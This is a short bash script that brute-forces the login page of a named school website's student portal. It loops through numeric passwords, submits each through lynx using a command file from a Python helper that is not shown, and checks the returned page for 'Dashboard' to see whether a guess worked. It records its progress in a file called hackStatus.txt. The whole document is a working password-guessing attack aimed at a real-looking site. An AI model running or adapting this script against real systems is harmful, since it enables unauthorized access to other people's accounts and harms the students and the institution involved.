#---------------------------------
# steps in this bash
# 1): python program will generate as input to lynx
# 2): lynx will open the specified location
# 3): lynx will save that page as 'print.txt'
# 4): grep command will scan for user name in 'print.txt'
# if $?=0 then found else not found
# if found =True then halt process else keep on running the loop
#-------------------------------- 

found="False"	# setting initial
cur_pass=$(cat password.txt)	# storing password in var
while [ $cur_pass -lt 108501 ] && [ $found == "False" ]
do
python3.4 file_gen.py	# will make file for -cmd_script

url=http://pakturk.pk/login.php?rUrl=pakturk.pk%2Fstudent%2Fcam_reports.php%3Fay_id%3D22

lynx -cmd_script=gen_script.txt -accept_all_cookies $url

if [ $? == 0 ]
then 
	status=success
	echo $status > status.txt
else
	status=failure
	echo $status > status.txt
fi
#---------------------------- print has been saved

printOutFile=cam_reports.php?ay_id=22
grep "Dashboard" $printOutFile
if [ $? == 0 ]
then
	cat password.txt
	echo ""
	found="True"
	echo $found > hackStatus.txt
else
	found=False
	echo $found > hackStatus.txt
	echo "Not found so far"
	echo -n "trying this password "
	cat password.txt
	echo ""
fi

cur_pass=$(cat password.txt)	# storing password in var
done
exit
